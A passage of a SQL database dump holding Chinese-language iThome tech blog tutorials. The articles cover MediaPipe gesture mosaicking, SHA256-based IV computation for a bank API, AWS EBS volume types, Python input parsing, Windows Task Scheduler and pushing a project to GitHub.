hand_angle(keypoint_pos)\n                    # 根據角度判斷此手勢是否為中指\n                    gesture_str = hand_gesture(angle_list)\n                    if gesture_str == "middle":\n                        for node in range(9, 13):\n                            center_x = int(keypoint_pos[node][0])\n                            center_y = int(keypoint_pos[node][1])\n                            frame = mosaic(frame, [center_x - 15 , center_y - 10], [center_x + 30, center_y + 50])\n        cv2.imshow(''MediaPipe Hands'', frame)\n        if cv2.waitKey(1) &amp; 0xFF == 27:\n            break\n    cap.release()\nif __name__ == ''__main__'':\n    detect()\n</code></pre>\n<p><strong>成果發表會</strong><br>\n<img src="https://ppt.cc/fT0FHx@.gif" alt=""><br>\n可以看到在<strong>只有比中指</strong>的時候才會打馬，因為我只寫一隻手，所以同時有兩個中指的話只會打馬一隻。<br>\n下圖是各種馬與不馬的情況:<br>\n<img src="https://ithelp.ithome.com.tw/upload/images/20210916/20133286drUqJZFtxy.png" alt="https://ithelp.ithome.com.tw/upload/images/20210916/20133286drUqJZFtxy.png"><br>\n從上圖發現，若同時有食指和中指，則中指不打馬。<br>\n若只有食指，則不打馬(不會誤認成中指)。<br>\n中指反過來，打馬(全面防護)。<br>\n中指倒過來，打馬(超全面防護)。</p>\n<p>經過上面的例證，證明這個AI有禮貌神器 大! 成! 功!<br>\n雖然我不知道這個東西可以用在哪裡，視訊上課可能可以用?</p>\n <br>\n                                                    </div>\n                    ','\n',char(10)),'Software Development',NULL,'2021-09-17 11:39:10');
INSERT OR REPLACE INTO articles VALUES('https://ithelp.ithome.com.tw/articles/10259904','計算API所需要的參數: IV','串接生活與金融 API','3',replace('\n                        <div class="markdown__style">\n                                                            <p>重點是要透過第一天的 Nonce 來算出 IV，果然金融機構的 API 就是複雜。要從計算的結果再計算…</p>\n<p>依規格書中的說明:</p>\n<p>產出IV值前必須要先行取得Nonce後才能產生，<br>\n計算方式是將取得的Nonce值作SHA256加密後，<br>\n再將英文轉換成大寫取字串右邊16碼長度<br>\n(例:CB6FA68E42B655AB)。</p>\n<p>今天的比較簡單，就把網路上查到的解法直接寫成程式碼與註解吧 ：</p>\n<pre><code># 戴入內建的hashlib 模組\nimport hashlib\n# 字串轉為 SHA256的編碼如下\n# 其中 Nonce_str 是上次算出來的 Nonce 內容\nsha256 = hashlib.sha256(Nonce_str.encode()).hexdigest()\n\n# 透過 upper 方法轉成大寫\nsha256_upper = sha256.upper() \n\n# 若要實作像是 Excel 中的 Right 函數，在 Python 中極為簡單\n# 要從右邊數過來取幾個文字，例如 16，這時再加上一個負號 -16，\n# 如此這樣就可以囉 &gt;&gt; [-16:] \nIV_value = sha256_upper[-16:]\n</code></pre>\n<p>好的! 明天也要繼續加油<img src="/images/emoticon/emoticon33.gif" alt="/images/emoticon/emoticon33.gif"></p>\n <br>\n                                                    </div>\n                    ','\n',char(10)),'永豐金融APIs',NULL,'2021-09-03 19:26:20');
INSERT OR REPLACE INTO articles VALUES('https://ithelp.ithome.com.tw/articles/10264904','Day 11 運算寶石：EC2 儲存資源 EBS Types 方案比較','無限手套 AWS 版：掌控一切的 5 + 1 雲端必學主題','11',replace('\n                        <div class="markdown__style">\n                                                            <p><img src="https://ithelp.ithome.com.tw/upload/images/20210914/20100951aqaopPkpM7.jpg" alt="https://ithelp.ithome.com.tw/upload/images/20210914/20100951aqaopPkpM7.jpg"></p>\n<p>今天我們要來介紹 EBS Type方案比較，那我們開始吧!</p>\n<p>在之前的文章中我們有提過，EBS 相對於 Instance Storage 在 I/O 方面比較弱，因此AWS提供給我們以下四種 EBS Type，讓我們根據 I/O 需求來做選擇。</p>\n<p>接下來會針對四種 Type 來做介紹。</p>\n<h4>SSD 與 HDD 與底下四種類別</h4>\n<p>在 SSD 底下有 io1 與 gp2 兩種類別，在 HDD 底下有 st1 與 sc1 兩種類別，如下圖:<br>\n<img src="https://ithelp.ithome.com.tw/upload/images/20210905/201009514LKiAZd2OA.png" alt="https://ithelp.ithome.com.tw/upload/images/20210905/201009514LKiAZd2OA.png"></p>\n<p>接著，我們要來比較四種類別在各項數據的比較</p>\n<p>(1) Max Storage: 這四種的最大容量都為 16TB。</p>\n<p>(2) I/O: I/O 為 Input/Output 的簡寫，用來評量檔案讀寫的速度效能。</p>\n<p>(3) IOPS: 全名叫做 I/O Per Second，用一句話說明 IOPS，就是「每秒可處理的 I/O 請求次數」。Io1 可以處裡的請求次數為 64,000，gp2 為 16,000，st1 為 500，sc1 只有 250。</p>\n<p>(4) IO Packet Size: 指的是當我們每次處裡一個 I/O 請求時，那一個 Package 的 Size 大小。SSD 底下的兩個 type 的 Size 都為 KB，HDD 底下兩個 Type 的 Size 都是 1MB。之所以會有那麼大的差別，是因為在 SSD 底下，是針對「次數高但量小的使用情境」，而 HDD 則相反，去處理「次數少但量大的狀況」。</p>\n<p>上述三種數據的整理如下圖:<br>\n<img src="https://ithelp.ithome.com.tw/upload/images/20210905/20100951H0EchykncY.png" alt="https://ithelp.ithome.com.tw/upload/images/20210905/20100951H0EchykncY.png"></p>\n<p>再來，我們將繼續介紹各項數據。</p>\n<p>Throughput: Throughput就是「每秒可以處理的I/O資料總量」，而資料總量怎麼來的呢？資料總量其實就是把 IOPS 乘以 I/O Packet Size。以io1 為例子，64000 乘以 16KB，轉換為 MB 單位 (除以1024) 後，就得出每秒可以處理的 I/O 資料總量為 1000MB/s。而另外三種 Type 經過計算後可得出，gp2 處理 250MB/s，st1 處理 500MB/s，sc1 處理 250MB/s。</p>\n<p>Cost: 這邊以相對的數值來建立數字級距的概念，以處理一單位資料的花費來看，以 $ 當作比較符號，可以看到 SSD 普遍價格較高，HDD 則相對較低。如下圖:<br>\n<img src="https://ithelp.ithome.com.tw/upload/images/20210905/20100951b8nrEYXSY7.png" alt="https://ithelp.ithome.com.tw/upload/images/20210905/20100951b8nrEYXSY7.png"></p>\n<h4>比較數值意義</h4>\n<h4>HDD</h4>\n<p>最重要的數值是 Throughput，st1 處理 500MB/s，sc1 處理 250MB/s，勝過 gp2，不過大家可能會看到 io1 可以達到 1000MB/s，那麼比較起來，io1 不是最好的嗎？沒錯，他是最好的，然而我們在挑選方案時還是得要將「花費」這個因素考慮進去，io1 是四種中花費最高的。</p>\n<p>可以看到 sc1 的花費最低，又可以達到 250MB/s，其實蠻經濟實惠，而 gp2 則必須花到 4 倍的花費才能達到 sc1 的 Throughput。所以，如果使用情境是在意 Throughput 的話，選擇 gp2 實在是不划算。</p>\n<p>當我們要使用 HDD 底下的 Type 時，必須看到 Throughput 與 Cost 兩個數值，看看所選 Type 的 Throughput 是否能達到我們的要求，又能幫我們省下多少錢。<br>\n<img src="https://ithelp.ithome.com.tw/upload/images/20210905/20100951Ygb7tLcgl9.png" alt="https://ithelp.ithome.com.tw/upload/images/20210905/20100951Ygb7tLcgl9.png"></p>\n<h4>SDD</h4>\n<p>底下兩個 Type 都是以 IOPS 為主要數值，所針對的情境為在每秒處裡最多的 I/O 請求次數，雖說他比 HDD 的價格高上許多，相對的，他的 IOPS 也大幅提升。</p>\n<p>所以當我們使用 SSD 底下的 Type 時，就是願意花大錢來買很高的 IOPS 能力，如下圖:<br>\n<img src="https://ithelp.ithome.com.tw/upload/images/20210905/20100951DTOrv2Hici.png" alt="https://ithelp.ithome.com.tw/upload/images/20210905/20100951DTOrv2Hici.png"></p>\n<h4>四個 Type 適用情境</h4>\n<p>io1: 若在 EC2 上有建立「資料庫」的話適合使用，因為在資料庫處理中的 CRUD，可能都是資料小但請求次數多的狀況。</p>\n<p>gp2: 建議使用於「開機硬碟」上，這也是 AWS 建議大家使用的預設硬碟選擇，可以使開機速度快，費用也不像 io1 那麼貴。</p>\n<p>st1: 建議使用在「影音串流」上，影音串流的請求頻率不高，但每次都是幾GB的容量。</p>\n<p>sc1: 建議使用在「資料封存」的使用情境，因為去使用資料的頻率一定非常低，且保存花費也不那麼高。</p>\n<p>以上四點整理成下圖。<br>\n<img src="https://ithelp.ithome.com.tw/upload/images/20210905/20100951yBxkXWi0i8.png" alt="https://ithelp.ithome.com.tw/upload/images/20210905/20100951yBxkXWi0i8.png"></p>\n<h4>EBS 效能</h4>\n<p>SSD 最強的效能是 IOPS，HDD 則是 Throughput，然而在我們決定最後 EBS 可以得到的效能是什麼的時候，其實是由兩種要件組成的。</p>\n<p>首先是我們上述討論的 EBS Type 不同的效能，而當我們 EBS Volume 被 Attach 到一台 EC2 Instance 上面時，那台 Instance 的 EC2 Type 其實也會影響我們最後 EBS Volume 的效能，所以最後會由兩者的交結點來決定我們最後拿到的 EBS 效能。如下圖，儘管左邊 EBS type 效能高，但最終還是會被右邊 ec2 type 最高效能給拉下來，最後取出交集處，如下圖。<br>\n<img src="https://ithelp.ithome.com.tw/upload/images/20210905/20100951XcHg4I4i0a.png" alt="https://ithelp.ithome.com.tw/upload/images/20210905/20100951XcHg4I4i0a.png"></p>\n<h4>小結</h4>\n<p>這邊給大家兩個好記的標語：</p>\n<p>當我們想到 HDD 底下的 st1 或是 sc1 時，就可以想到他是「便宜大流量」。當我們想到 SDD 底下的 io1 或是 gp2 時，就可以想到他是「高貴快手速」。各自的適合使用情境整理如下圖:<br>\n<img src="https://ithelp.ithome.com.tw/upload/images/20210905/20100951eveXhSYYxh.png" alt="https://ithelp.ithome.com.tw/upload/images/20210905/20100951eveXhSYYxh.png"></p>\n<p>那以上就是我們針對告種不同 EBS Type 的方案比較。</p>\n<h4>What''s Next?</h4>\n<p>明天我們將接著介紹「【Lab】EC2儲存資源 EBS Volume 建立與使用」。</p>\n <br>\n                                                    </div>\n                    ','\n',char(10)),'IT管理',NULL,'2021-09-16 08:06:46');
INSERT OR REPLACE INTO articles VALUES('https://ithelp.ithome.com.tw/articles/10277413','【Day 20】Python 一行內輸入多個數字、多個字串及好用的刷題網站推薦','宇宙 69 大魔王的 python 世界','20',replace('\n                        <div class="markdown__style">\n                                                            <h2>前言</h2>\n<p>前面介紹了那麼多語法，應該來實際使用看看了。要提升自己的程式能力有很多辦法，刷題也是一種能讓程式能力進步的手段，裡面的題目常常會要你輸入一整組數字，或是一次輸入很多字串，或是要輸入一堆數字輸出一組一組的 <code>list</code> 但不知道怎麼輸入呢，今天要來介紹一些跟輸入有關的函式。</p>\n<h2>語法</h2>\n<ul>\n<li>\n<p>輸入字串：直接使用 <code>input()</code> 就可以了<br>\n<img src="https://i.imgur.com/8NpYxgM.png" alt=""></p>\n</li>\n<li>\n<p>輸入整數：<code>變數 = int(input())</code><br>\n<img src="https://i.imgur.com/tTOP6DU.png" alt=""></p>\n</li>\n<li>\n<p><code>.split()</code>：把輸入的內容根據括號內的字去分割，預設為 <code>'' ''</code> 空格<br>\n<img src="https://i.imgur.com/sJ8k7tl.png" alt=""></p>\n</li>\n<li>\n<p>輸入多個字串 <code>str</code> 到多個變數內</p>\n<pre><code class="language-python=">a,b = input().split()\n</code></pre>\n<p><img src="https://i.imgur.com/P48Jf2g.png" alt=""></p>\n</li>\n<li>\n<p>輸入多個數字到多個變數內</p>\n<pre><code class="language-python=">a,b = map(int,input().split())\n</code></pre>\n<p><img src="https://i.imgur.com/yFRwUbY.png" alt=""></p>\n</li>\n<li>\n<p>輸入多個數進入 <code>list</code></p>\n<pre><code class="language-python=">list123 = list(map(int, input().split()))\n</code></pre>\n<p><img src="https://i.imgur.com/DZCnoLE.png" alt=""></p>\n</li>\n<li>\n<p>輸入一段字串，並把他分割給 <code>list</code> 的每一個 index 一個字</p>\n<pre><code class="language-python=">a = input(''請輸入Roman: '')\nx = [i for i in a]\n</code></pre>\n<p><img src="https://i.imgur.com/fn5he6A.png" alt=""></p>\n</li>\n</ul>\n<h2>刷題網站</h2>\n<p><a href="https://www.hackerrank.com" target="_blank">hackerrank</a><br>\n這邊推薦一個<a href="https://www.hackerrank.com" target="_blank">刷題網站</a>，他的題目難易度適中，很適合新手去這邊瘋狂刷題，寫一寫沒有想法也可以去討論區看看其他人的解法。</p>\n<p>寫程式很重要的一件事，就是要會讀別人的程式碼，並把你覺得不錯的、有料的寫法把他記住，內化為自己。</p>\n<h3>使用方法</h3>\n<ul>\n<li>\n<p>進入網站，點擊紅色框框內的 Sign Up &amp; Code<br>\n<img src="https://i.imgur.com/qi8g8US.png" alt=""></p>\n</li>\n<li>\n<p>用任意方式登入網站<br>\n<img src="https://i.imgur.com/BZhEWId.png" alt=""></p>\n</li>\n<li>\n<p>選擇 Python<br>\n<img src="https://i.imgur.com/z0Egsnp.png" alt=""></p>\n</li>\n<li>\n<p>進入題目<br>\n<img src="https://i.imgur.com/24jKqjZ.png" alt=""></p>\n</li>\n<li>\n<p>往下滑提交程式碼的地方改為 <code>Python3</code><br>\n<img src="https://i.imgur.com/lUCA6zf.png" alt=""></p>\n</li>\n<li>\n<p>交答案！<br>\n<img src="https://i.imgur.com/2mIajv7.png" alt=""></p>\n</li>\n</ul>\n<p>開始你的刷題旅程吧！</p>\n<p>待續...</p>\n <br>\n                                                    </div>\n                    ','\n',char(10)),'Software Development',NULL,'2021-10-05 16:12:08');
INSERT OR REPLACE INTO articles VALUES('https://ithelp.ithome.com.tw/articles/10276390','工作排程器--Windows的忠實程序秘書','妄想對自己的Windows優化兼Debug的工程師很正常吧','26',replace('\n                        <div class="markdown__style">\n                                                            <p>今天要來介紹一個Windwos內建工具叫做工作排程器(Task Scheduler)，他可以預先計劃在特定時間或指定時間後啟動程式，也可以設定循環的時間差讓系統每隔一段時間就執行一次特定工作，例如例行的檢查更新，或是病毒掃描等等，也可以設定開機自啟動的程式，以前看過網路上有類似的軟體覺得很實用，現在才發現原來內建就有這種功能了，我們來看看怎麼操作，順便檢查有什麼排程也在定期執行。</p>\n<hr>\n<p>首先用Win+R，輸入taskschd.msc執行工作排程器，主要從右側的動作欄操作。<br>\n<img src="https://i.imgur.com/SLoAz1E.png" alt="Imgur"></p>\n<p>筆者進來的第一件事是發現VisualStudio也有工作排程，內容是電腦閒置檢查更新，其實我沒有常用這個IED，一看到是進去Visual Studio還真的找到有自動檢查更新的選項被預設開啟，所以工作排程也可以找出一些默默定期執行的程式。<br>\n<img src="https://i.imgur.com/VtcCMiR.png" alt="Imgur"></p>\n<hr>\n<h1>建立基本工作排程</h1>\n<p>處理完小問題後，現在讓我們先從基本款的開始，舉個例子，假設我們想要設定電腦每天早上8點自動重新啟動，點選右側的<code>建立基本工作...</code>會開啟一個設定精靈，先輸入名稱跟描述。<br>\n<img src="https://i.imgur.com/YLMIaRd.png" alt="Imgur"></p>\n<p>觸發程序主要是選擇觸發的間隔，選擇很多樣，甚至可以僅限一次或是當特定事件發生的時候再執行，這裡我們選擇每天。<br>\n<img src="https://i.imgur.com/4rnHKkC.png" alt="Imgur"></p>\n<p>設定開始這項計畫工作的時間，間隔天數這裡也可以更改。<br>\n<img src="https://i.imgur.com/xlo3ghY.png" alt="Imgur"></p>\n<p>選擇啟動程式。<br>\n<img src="https://i.imgur.com/tBa9qSi.png" alt="Imgur"></p>\n<p>如下設定，重新啟動這件事就是執行shutdown.exe，並給出參數/r帶表重新啟動，可以打開cmd輸入<code>shutdown.exe /?</code>查看功能。<br>\n<img src="https://i.imgur.com/447daiy.png" alt="Imgur"><br>\n<img src="https://i.imgur.com/NRBOLOc.png" alt="Imgur"></p>\n<p>最後按完成就可以，工作就會加入排程，開啟排程的內容會長這樣子，可以繼續編輯設定，另外，如果我們直接點選右側的<code>建立工作…</code>的話，也會開起這個視窗，內容就要手動一一設定。<br>\n<img src="https://i.imgur.com/3qNlr8R.png" alt="Imgur"><br>\n這樣子電腦就會自2021/10/10開始，每天早上8點自動重新開機一次了。</p>\n<p>另外工作排程也可以被右鍵匯出成.xml格式，也可以用這個格式再度被匯入到排程當中。<br>\n<img src="https://i.imgur.com/gUEhc0Y.png" alt="Imgur"></p>\n<hr>\n<h1>傳送訊息的提醒排程</h1>\n<p>不過剛剛在動作的地方除了啟動程式外，你會發現還有其他功能像是傳送訊息，但他又寫已過時，如果今天我就是想用工作排程當鬧鐘每天晚上12點傳訊息跟我說晚安不要太晚睡了，也不是不可以，一樣選擇啟動程式照下面的設定，程式選擇msg，引數填<code>* “要說的話”</code>，注意在星號後面有空格，此處的星號則是發送給所有用戶的意思。<br>\n<img src="https://i.imgur.com/KZVNV6w.png" alt="Imgur"></p>\n<p>但這又有個問題，家用版Windows沒有msg功能，本來我們到cmd輸入<code>msg /?</code>應該可以找到他的說明，家用版只會什麼都找不到，於是我只好用另一台專業版的桌機來展示給大家看：<br>\n<img src="https://i.imgur.com/3Ooe7us.jpg" alt="Imgur"></p>\n<p>不過家用版……還是有可以將就點的辦法，只是稍微複雜些，我們在執行程式的地方填入CMD，新增的參數如下：</p>\n<blockquote>\n<p>/C TITLE 這是晚安提醒標題 &amp;ECHO.&amp;ECHO 晚安，早點睡喔 &amp;ECHO.&amp;TIMEOUT -1</p>\n</blockquote>\n<p><img src="https://i.imgur.com/mQ20jrp.png" alt="Imgur"></p>\n<p>一開始的/C表示執行後續命令後關閉CMD窗口，以CMD來說就是不會出現下一行可以輸入命令，而是按任一鍵以繼續的那行文字來關閉視窗，TITLE空格後接提醒訊息的標題，&amp;符號表示接續下一個命令的意思，ECHO空格後接要傳送的訊息，如國直接接.代表空行，最後TIMEOUT空格後的數字表示幾秒鐘後自動關閉提示框，如果接-1就是不自動關閉，要等使用者按下任一鍵才結束。</p>\n<p>我們也可以把這些命令存成一個.bat檔讓排程去執行也是一樣的意思。<br>\n<img src="https://i.imgur.com/zLzRIfB.png" alt="Imgur"><br>\n這樣也是可以當做一個排程提醒，表達一個簡單的提示訊息，讓他在每晚12點自己跳出來。</p>\n<h1>建立工作排程</h1>\n<p>如果我們直接點選右側的<code>建立工作…</code>，會跳過精靈直接新增一個排程，以下筆者示範一個鐵人發文提醒，會在晚上9點打開chrome到自己的鐵人文章區，讓我記得檢查看看。</p>\n<p><img src="https://i.imgur.com/aVUrSDS.png" alt="Imgur"><br>\n首先在「一般」先設定名稱及描述。</p>\n<p><img src="https://i.imgur.com/31LREAX.png" alt="Imgur"><br>\n再來「觸發程序」點選新增，開始工作時間選擇依程序執行，設定開始日期時間選9點，間隔是每隔1天，下面可以設定到期時間就到鐵人的最後一天結束，讓這個排程失效，最後要勾選已啟用才會就緒。</p>\n<p>「動作」頁面點選新增，設定啟動程式瀏覽到chrome的應用程式位置<code>C:\Program Files (x86)\Google\Chrome\Application</code>，這可以到工作管理員對chrome按右鍵-內容，找到目標程式位置，接著新增引數放入自己的鐵人檔案網址。<br>\n<img src="https://i.imgur.com/Re4mQbK.png" alt="Imgur"></p>\n<p>「條件」頁面是用AND邏輯判斷，因為我的筆電都接著電源所以AC電源的那個設定對我沒影響，倒是有時候會離開座位會待機，所以可以勾選喚醒電腦以執行工作避免排程因為待機而阻斷。<br>\n<img src="https://i.imgur.com/Ok5uXTa.png" alt="Imgur"></p>\n<p>設定頁面可以根據個人需求調整，主要是一些項是工作啟動失敗或是已經正在執行的處置設定，最後按下確定就大功告成了！要測試的話可以跟筆者一樣先把時間調到現在時間的後一分鐘比較方便測試。<br>\n<img src="https://i.imgur.com/WQKrrIt.png" alt="Imgur"></p>\n<p>今天介紹工作排程器，網路上也有類似的軟體跟他有相似的功能，對一個專業IT人員來說，這個內建軟體可以發揮基本的排程能力，下篇我們要介紹下個系統管理工具，效能監視器，讓我們一目瞭然系統有沒有在我們預期之內。</p>\n<p><img src="https://i.imgur.com/lRIblFv.png" alt="Imgur"></p>\n<p>參考資料：<br>\n<a href="https://en.wikipedia.org/wiki/Windows_Task_Scheduler" target="_blank">https://en.wikipedia.org/wiki/Windows_Task_Scheduler</a><br>\n<a href="https://key.chtouch.com/cv.aspx?p=2487" target="_blank">https://key.chtouch.com/cv.aspx?p=2487</a><br>\n<a href="https://blog.3bro.info/archives/task-scheduler-error-2147750704/" target="_blank">https://blog.3bro.info/archives/task-scheduler-error-2147750704/</a><br>\n<a href="https://superuser.com/questions/709725/display-message-box-from-task-scheduler-on-top-of-all-other-windows" target="_blank">https://superuser.com/questions/709725/display-message-box-from-task-scheduler-on-top-of-all-other-windows</a><br>\n<a href="https://www.howtogeek.com/136894/how-to-create-popup-reminders-with-no-additional-software/" target="_blank">https://www.howtogeek.com/136894/how-to-create-popup-reminders-with-no-additional-software/</a><br>\n<a href="https://medium.com/coding-learning-sharing/windows-%E5%B7%A5%E4%BD%9C%E6%8E%92%E7%A8%8B-56989747a1ce" target="_blank">https://medium.com/coding-learning-sharing/windows-%E5%B7%A5%E4%BD%9C%E6%8E%92%E7%A8%8B-56989747a1ce</a></p>\n <br>\n                                                    </div>\n                    ','\n',char(10)),'Software Development',NULL,'2021-10-05 08:30:28');
INSERT OR REPLACE INTO articles VALUES('https://ithelp.ithome.com.tw/articles/10280309','Day27｜在 GitHub 上建立專案與使用 git push 指令將檔案上傳到 GitHub','【Git】從零開始學習 Git - 30 天的學習筆記','27',replace('\n                        <div class="markdown__style">\n                                                            <p>先前介紹了很多關於 Git 的常用指令以及使用情況，但目前我們都只是在本地端操作而已，如果需要跟別人共同製作專案，或是想要傳送到開放空間請教各個寫 Code 大師，這時候我們就會需要 Push 到遠端數據庫啦！</p>\n<p>現在最常聽見與使用的遠端數據庫是 <strong>GitHub</strong> ，接下來就讓我們慢慢了解 GitHub 是什麼，我們又要怎麼把我們的檔案傳送到 GitHub 呢？</p>\n<hr>\n<h2>GitHub 是什麼？</h2>\n<p>簡單來說，GitHub 就是一個提供存取 Git 的站點、遠端數據庫，可以將自己寫好的專案分享上傳。</p>\n<p>但要注意的是！Git 跟 GitHub 兩個完全是不一樣的東西唷！</p>\n<p>👉 <strong>Git 被作為工具</strong>，讓我們執行檔案的管理並提交到儲存庫；而 <strong>GitHub 則是一個網站</strong>，本體是一個 Git Server ，提供除了基本的存取站點，也提供一些社群功能。</p>\n<p>GitHub 是一個由 GitHub 公司所建立的網站，同時提供付費帳戶與免費帳戶，讓使用著可以在這個 Git Server  建立自己的數據庫，並存取保管中的代碼。而相較於其他的 Git Server ，GitHub 還有一個特點是它類似於一個<strong>社群網頁</strong>，擁有追蹤（ Fallow ）、按讚（ Star ）其他使用者、數據庫有誰參與並追蹤最新版本，也有評論並提供複製（ Fork ）專案給予其他人的專案建議，而其他人同樣也可以回饋給你的專案。</p>\n<blockquote>\n<p>除此之外，提醒 GitHub 的 G 跟 Ｈ 都是大寫英文喔！</p>\n</blockquote>\n<hr>\n<h2>設定屬於自己的 GitHub 空間！</h2>\n<p>了解 GitHub 是什麼以後，接下來就動手將我們的專案 Push 上去吧～</p>\n<h3>Step 1 - 註冊 GitHub</h3>\n<p>到 <a href="https://github.com" target="_blank">GitHub</a> 官網註冊會員。</p>\n<p><img src="https://ithelp.ithome.com.tw/upload/images/20211011/20141010U5VQl4cSzH.png" alt="https://ithelp.ithome.com.tw/upload/images/20211011/20141010U5VQl4cSzH.png"></p>\n<p>註冊完後，點擊 Profile ，可以進入個人的 GitHub 頁面。</p>\n<p><img src="https://ithelp.ithome.com.tw/upload/images/20211011/20141010x15yYjjESW.png" alt="https://ithelp.ithome.com.tw/upload/images/20211011/20141010x15yYjjESW.png"></p>\n<h3>Step 2 - 在 GitHub 建立新的數據庫</h3>\n<p>當要上傳檔案時，我們需要在 GitHub 開新的專案。</p>\n<p>可以點選右上角會員頭貼的下拉選單，選擇「Your Repositiories」後進入頁面，再點選 「 New 」新增專案。</p>\n<p><img src="https://ithelp.ithome.com.tw/upload/images/20211011/20141010bGYjAsvUhO.png" alt="https://ithelp.ithome.com.tw/upload/images/20211011/20141010bGYjAsvUhO.png"><br>\n<img src="https://ithelp.ithome.com.tw/upload/images/20211011/20141010lhp69rEZkJ.png" alt="https://ithelp.ithome.com.tw/upload/images/20211011/20141010lhp69rEZkJ.png"></p>\n<p>或是旁邊的 + 號也可以選擇 「New repository」</p>\n<p><img src="https://ithelp.ithome.com.tw/upload/images/20211011/20141010hAj2OCyJB9.png" alt="https://ithelp.ithome.com.tw/upload/images/20211011/20141010hAj2OCyJB9.png"><br>\n<img src="https://ithelp.ithome.com.tw/upload/images/20211011/20141010qZw4ZIL5ET.png" alt="https://ithelp.ithome.com.tw/upload/images/20211011/20141010qZw4ZIL5ET.png"></p>\n<p>之後就會進入到 <strong>Creat a new repository</strong> 的頁面：</p>\n<p><img src="https://ithelp.ithome.com.tw/upload/images/20211011/20141010Zw9q70mbQp.png" alt="https://ithelp.ithome.com.tw/upload/images/20211011/20141010Zw9q70mbQp.png"></p>\n<p>填寫專案名稱、選擇存取權限、按下 Creat repository 完成新增專案。</p>\n<p><img src="https://ithelp.ithome.com.tw/upload/images/20211011/201410103FZimIynQu.png" alt="https://ithelp.ithome.com.tw/upload/images/20211011/201410103FZimIynQu.png"></p>\n<p>接下來會導入到以下這個畫面：</p>\n<p><img src="https://ithelp.ithome.com.tw/upload/images/20211011/2014101099VvN4e3cd.png" alt="https://ithelp.ithome.com.tw/upload/images/20211011/2014101099VvN4e3cd.png"></p>\n<p>頁面說明｜</p>\n<ul>\n<li>\n<code>creat a new repository on the command line</code> - 適用於全新開始</li>\n<li>\n<code>push an existing repository from the command line</code>  - 上傳現存專案</li>\n</ul>\n<p>接下來可以先把網址複製起來，後續步驟會用到。</p>\n<p><img src="https://ithelp.ithome.com.tw/upload/images/20211011/201410106YeZMCUB0M.png" alt="https://ithelp.ithome.com.tw/upload/images/20211011/201410106YeZMCUB0M.png"></p>\n<h3>Step 3 - 將檔案上傳到 Push</h3>\n<p>假設我們目前什麼都沒有，要找一個空的目錄。</p>\n<p>因此我們跟著 <code>create a new repository on the command line</code> 這個步驟執行指令：</p>\n<ol>\n<li>建立一個 README.md 檔案</li>\n</ol>\n<pre><code>$ echo "# Vue_Todolist" &gt;&gt; README.md # 建立一個 README.md 檔案\n</code></pre>\n<p><img src="https://ithelp.ithome.com.tw/upload/images/20211011/20141010hqmhWkdezW.png" alt="https://ithelp.ithome.com.tw/upload/images/20211011/20141010hqmhWkdezW.png"></p>\n<ol start="2">\n<li>\n<code>git init</code> 指令建立 Git 版本控制</li>\n</ol>\n<pre><code>$ git init # 進行版本控制\n</code></pre>\n<p><img src="https://ithelp.ithome.com.tw/upload/images/20211011/20141010gr8RDHgFcv.png" alt="https://ithelp.ithome.com.tw/upload/images/20211011/20141010gr8RDHgFcv.png"></p>\n<ol start="3">\n<li>將 <a href="http://README.md" target="_blank">README.md</a> 檔案加至暫存區</li>\n</ol>\n<pre><code>$ git add README.md # 將 [README.md](http://README.md) 檔案加至暫存區\n</code></pre>\n<p><img src="https://ithelp.ithome.com.tw/upload/images/20211011/201410102xwwfYwe6q.png" alt="https://ithelp.ithome.com.tw/upload/images/20211011/201410102xwwfYwe6q.png"></p>\n<ol start="4">\n<li>提交到數據庫</li>\n</ol>\n<pre><code>$ git commit -m "first commit"\n</code></pre>\n<p><img src="https://ithelp.ithome.com.tw/upload/images/20211011/20141010maeTKEkkaY.png" alt="https://ithelp.ithome.com.tw/upload/images/20211011/20141010maeTKEkkaY.png"></p>\n<ol start="5">\n<li>建立分支</li>\n</ol>\n<pre><code>$ git branch -M main\n</code></pre>\n<p><img src="https://ithelp.ithome.com.tw/upload/images/20211011/20141010t7jBL6gxOm.png" alt="https://ithelp.ithome.com.tw/upload/images/20211011/20141010t7jBL6gxOm.png"></p>\n<ol start="6">\n<li>\n<p><strong>將檔案推上遠端數據庫 ｜設定一個端節的節點</strong></p>\n<pre><code>$ git remote add origin https://github.com/cycChuyin/Vue_Todolist.git\n</code></pre>\n<ul>\n<li>\n<code>git remote</code> 指令 - 跟遠端有關係的操作（ remote ，遠端之意）</li>\n<li>\n<code>add</code> 指令 → 加入一個遠端的節點</li>\n<li>\n<code>origin</code> 為指向位置的代名詞，這裡代表後面提供的伺服器位置（此位置與我們先前複製的相同）。</li>\n</ul>\n<p><img src="https://ithelp.ithome.com.tw/upload/images/20211011/201410107qRD6XfKBk.png" alt="https://ithelp.ithome.com.tw/upload/images/20211011/201410107qRD6XfKBk.png"></p>\n</li>\n<li>\n<p><strong>將檔案推上遠端數據庫 ｜git push</strong></p>\n<p>設定好節點後，可以將檔案 push 上去</p>\n<pre><code>$ git push -u origin main\n</code></pre>\n<p>說明 Push 指令：</p>\n<ul>\n<li>將 <code>main</code> 這個分支的內容推向 <code>origin</code> 這個位置。</li>\n</ul>\n<blockquote>\n<p>先前 <code>origin</code> 已經有代指我們 GitHub 要上傳的位子</p>\n</blockquote>\n<ul>\n<li>\n<code>origin</code> 如果沒有 <code>main</code> ，則自動建立一個同樣叫做 <code>main</code> 的分支。如果本來就有 <code>main</code> 分支，則會將此分支指向最新進度。</li>\n<li>\n<code>-u</code> 參數，設定 upstream。</li>\n</ul>\n<p><img src="https://ithelp.ithome.com.tw/upload/images/20211011/201410108jHr3J4hjj.png" alt="https://ithelp.ithome.com.tw/upload/images/20211011/201410108jHr3J4hjj.png"></p>\n<blockquote>\n<p>執行 Push 指令時，可能會要求你輸入 GitHub 的帳號密碼。而這裡的回饋訊息是說會需要一個 token ，可以根據訊息回饋來操作。<br>\n<a href="https://github.blog/2020-12-15-token-authentication-requirements-for-git-operations/" target="_blank">Token authentication requirements for Git operations</a> - 說明為何遇到這種情況及解決方式如何進行。<br>\n<a href="https://docs.github.com/en/authentication/keeping-your-account-and-data-secure/creating-a-personal-access-token" target="_blank">Creating a personal access token</a> - 後續跟著指示操作，得到金鑰以後便可以回到 Git 繼續操作。</p>\n</blockquote>\n<p><img src="https://ithelp.ithome.com.tw/upload/images/20211011/20141010wqH5sv2CX2.png" alt="https://ithelp.ithome.com.tw/upload/images/20211011/20141010wqH5sv2CX2.png"></p>\n<p>之後回到頁面上重新整理：</p>\n<p><img src="https://ithelp.ithome.com.tw/upload/images/20211011/20141010AabfL1PKke.png" 